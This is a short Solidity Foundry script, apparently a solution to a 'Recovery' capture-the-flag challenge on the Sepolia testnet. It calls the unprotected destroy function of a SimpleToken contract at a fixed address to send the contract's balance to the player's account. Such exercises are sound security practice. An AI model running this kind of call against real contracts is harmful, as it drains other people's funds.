// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {HelperConfig} from "./HelperConfig.s.sol";
import {Vault} from "../src/Vault.sol";
import {SimpleToken} from "../src/Recovery.sol";

contract HackRecoveryScript is Script {
    function run() public {
        HelperConfig helperConfig = new HelperConfig();
        address player = helperConfig.getBasicSepoliaConfig().account;
        SimpleToken token = SimpleToken(payable(0x09d2Ea021FAC01B7a525443c6D83B4D0A26248Aa));
        vm.startBroadcast();
        token.destroy(payable(player));
        vm.stopBroadcast();
    }
}
